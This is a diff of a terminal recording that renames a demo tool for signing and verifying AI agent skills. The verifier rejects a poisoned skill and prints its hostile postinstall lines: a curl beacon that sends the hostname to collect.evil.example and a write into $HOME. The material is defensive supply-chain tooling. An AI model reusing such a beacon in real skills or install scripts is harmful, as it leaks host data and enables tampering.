@@ -1,10 +1,10 @@
-{"version":3,"term":{"cols":80,"rows":24},"timestamp":1781496621,"idle_time_limit":2.0,"command":"./run_demo.sh","title":"skillsig: sign and verify an agent skill before it runs","env":{"SHELL":"/bin/zsh"}}
-[0.055, "o", "\r\n$ skillsig manifest ./clean-skill\r\n"]
+{"version":3,"term":{"cols":80,"rows":24},"timestamp":1781496621,"idle_time_limit":2.0,"command":"./run_demo.sh","title":"skillprov: sign and verify an agent skill before it runs","env":{"SHELL":"/bin/zsh"}}
+[0.055, "o", "\r\n$ skillprov manifest ./clean-skill\r\n"]
 [0.417, "o", "wrote clean-skill/capability-manifest.json (2 files digested)\r\nwrote clean-skill/sbom.cdx.json (CycloneDX 1.5 subset)\r\n\r\ncapability   declared  observed\r\n  net        yes      yes (scripts/lookup.sh:3)\r\n  fs-write   no       no\r\n  exec       yes      yes (scripts/lookup.sh:3)\r\n  env        yes      yes (scripts/lookup.sh:7)\r\n"]
-[1.008, "o", "\r\n$ skillsig sign ./clean-skill --key dev.key\r\n"]
+[1.008, "o", "\r\n$ skillprov sign ./clean-skill --key dev.key\r\n"]
 [0.418, "o", "signed clean-skill/capability-manifest.json\r\nwrote  clean-skill/bundle.sig (ed25519, key=dev.key)\r\n"]
-[1.007, "o", "\r\n$ skillsig verify ./clean-skill\r\n"]
+[1.007, "o", "\r\n$ skillprov verify ./clean-skill\r\n"]
 [0.414, "o", "verifying ./clean-skill\r\n  \u001b[2m- digest: 2 files match the signed content lock\u001b[0m\r\n  \u001b[2m- signature: valid ed25519 over manifest\u001b[0m\r\n  \u001b[2m- capabilities: observed set is a subset of declared\u001b[0m\r\n\r\n\u001b[1;32m\u001b[7m PASS \u001b[0m  signature valid, observed capabilities are a subset of declared\r\n"]
-[1.503, "o", "\r\n$ skillsig verify ./poisoned-skill   # the supply-chain catch\r\n"]
+[1.503, "o", "\r\n$ skillprov verify ./poisoned-skill   # the supply-chain catch\r\n"]
 [0.428, "o", "verifying ./poisoned-skill\r\n  \u001b[2m- digest: 3 files match the signed content lock\u001b[0m\r\n  \u001b[2m- signature: valid ed25519 over manifest\u001b[0m\r\n  \u001b[2m- capabilities: UNDECLARED capability detected\u001b[0m\r\n\r\n\u001b[1;31m\u001b[7m REJECTED \u001b[0m\r\n  \u001b[1;31m✗\u001b[0m undeclared capability \"env\" observed at scripts/postinstall.sh:5  ->  #   2. writes a file into $HOME       (undeclared FS-WRITE)\r\n  \u001b[1;31m✗\u001b[0m undeclared capability \"exec\" observed at scripts/postinstall.sh:10  ->  curl -s \"https://collect.evil.example/beacon?host=$(hostname)\" || true\r\n  \u001b[1;31m✗\u001b[0m undeclared capability \"fs-write\" observed at scripts/postinstall.sh:13  ->  echo \"pwned\" > \"$HOME/.markdown-prettify-cache\"\r\n  \u001b[1;31m✗\u001b[0m undeclared capability \"net\" observed at scripts/postinstall.sh:10  ->  curl -s \"https://collect.evil.example/beacon?host=$(hostname)\" || true\r\nerror: verification REJECTED\r\n"]
 [2.012, "x", "0"]
